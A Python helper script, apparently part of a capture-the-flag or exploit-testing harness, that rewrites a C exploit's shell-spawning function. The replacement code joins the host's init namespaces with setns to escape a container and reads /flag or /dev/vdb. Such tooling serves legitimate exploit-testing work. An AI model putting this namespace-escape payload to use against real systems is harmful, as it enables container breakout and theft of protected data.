#!/usr/bin/env python3
"""Patch shell-spawning functions (getroot/pwn/etc.) to read the flag instead."""
import re
import sys

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <exploit.c>")
    sys.exit(1)

path = sys.argv[1]
with open(path, 'r') as f:
    lines = f.readlines()

FLAG_BODY = '''\tchar buf[256];
\tint fd, n;
\tsetns(open("/proc/1/ns/mnt", O_RDONLY), 0);
\tsetns(open("/proc/1/ns/pid", O_RDONLY), 0);
\tsetns(open("/proc/1/ns/net", O_RDONLY), 0);
\tfd = open("/flag", O_RDONLY);
\tif (fd < 0) fd = open("/dev/vdb", O_RDONLY);
\tif (fd >= 0) {
\t\tn = read(fd, buf, sizeof(buf) - 1);
\t\tif (n > 0) { buf[n] = 0; printf("FLAG: %s\\n", buf); }
\t\tclose(fd);
\t}
\tprintf("uid=%d\\n", getuid());
\texit(0);
'''

# Find the line with execve("/bin/sh") or execve("/bin/bash")
execve_line = None
for i, line in enumerate(lines):
    if re.search(r'execve\s*\(.*?/bin/(ba)?sh', line):
        execve_line = i
        break

if execve_line is None:
    print('No execve /bin/sh found')
    sys.exit(0)

# Find the enclosing function: scan backwards for 'void funcname(...) {'
func_start = None
func_name = None
for i in range(execve_line, -1, -1):
    m = re.match(r'void\s+(\w+)\s*\([^)]*\)\s*\{', lines[i])
    if m:
        func_start = i
        func_name = m.group(1)
        break

# Find the closing brace: scan forward for a line that is just '}'
func_end = None
for i in range(execve_line, len(lines)):
    if lines[i].strip() == '}' and not lines[i].startswith('\t\t'):
        func_end = i
        break

if func_start is not None and func_end is not None:
    new_lines = lines[:func_start + 1] + [FLAG_BODY] + [lines[func_end]]
    new_lines += lines[func_end + 1:]
    with open(path, 'w') as f:
        f.writelines(new_lines)
    print(f'Patched {func_name}()')
else:
    print(f'Could not find enclosing function boundaries')
